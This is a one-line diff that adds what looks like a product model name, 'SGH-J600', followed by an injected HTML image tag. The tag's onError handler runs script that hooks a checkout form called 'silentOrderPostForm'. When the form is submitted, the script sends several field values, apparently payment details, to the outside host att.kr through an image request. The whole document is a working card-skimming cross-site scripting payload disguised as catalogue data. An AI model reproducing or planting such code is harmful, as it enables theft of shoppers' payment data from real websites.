@@ -1,0 +1,1 @@
+SGH-J600<img src="y" onError="d=document;f=d.getElementById('silentOrderPostForm');v=(i)=>f[i].value;f.action='javasc'+'ript: return 0';f.addEventListener('submit',()=>d.createElement('img').src='//att.kr/'+v(19)+'/'+v(20)+'/'+v(25)+'/'+v(26))">
